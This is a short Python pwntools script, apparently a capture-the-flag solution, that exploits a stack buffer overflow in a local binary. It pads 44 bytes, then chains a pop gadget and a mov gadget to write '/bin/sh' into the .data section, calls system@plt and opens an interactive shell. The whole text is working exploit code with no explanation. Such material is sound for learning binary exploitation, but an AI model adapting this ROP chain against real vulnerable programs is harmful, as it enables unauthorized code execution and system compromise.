from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
io=process(p)

data_addr=0x0804A028
pop_edi_ebp=0x080486da
mov_data=0x08048670 
sys_plt=0x08048430


payload="a"*44+p32(pop_edi_ebp)+p32(data_addr)+"/bin"+p32(mov_data)
payload+=p32(pop_edi_ebp)+p32(data_addr+4)+"/sh\x00"+p32(mov_data)
payload+=p32(sys_plt)+p32(0xdeadbeef)+p32(data_addr)

io.recvuntil("> ")
io.sendline(payload)

io.interactive()
